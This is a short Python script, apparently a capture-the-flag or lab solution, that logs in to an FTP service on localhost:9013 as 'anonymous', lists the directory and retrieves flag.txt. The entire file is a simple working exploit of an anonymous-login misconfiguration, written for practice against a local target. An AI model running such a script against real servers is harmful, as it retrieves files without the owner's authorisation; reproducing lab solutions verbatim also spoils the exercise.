#!/usr/bin/env python3
"""
Machine 1 - Anonymous FTP Access
Target: localhost:9013
Vulnerability: Anonymous FTP login enabled
"""

from ftplib import FTP
import sys

TARGET = "localhost"
PORT = 9013

def exploit():
    """Connect to FTP with anonymous credentials and list files"""
    try:
        ftp = FTP()
        ftp.connect(TARGET, PORT, timeout=10)
        ftp.login("anonymous", "")
        
        print("[+] Anonymous login successful!")
        print("-" * 50)
        
        # List files
        print("[*] Directory listing:")
        files = ftp.nlst()
        for f in files:
            print(f"    {f}")
        
        # Try to read flag
        print("-" * 50)
        print("[*] Attempting to read flag.txt:")
        
        lines = []
        ftp.retrlines("RETR flag.txt", lines.append)
        for line in lines:
            print(f"    {line}")
        
        ftp.quit()
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    print("[*] Machine 1 - Anonymous FTP Access")
    print(f"[*] Target: {TARGET}:{PORT}")
    print("-" * 50)
    
    exploit()

if __name__ == "__main__":
    main()
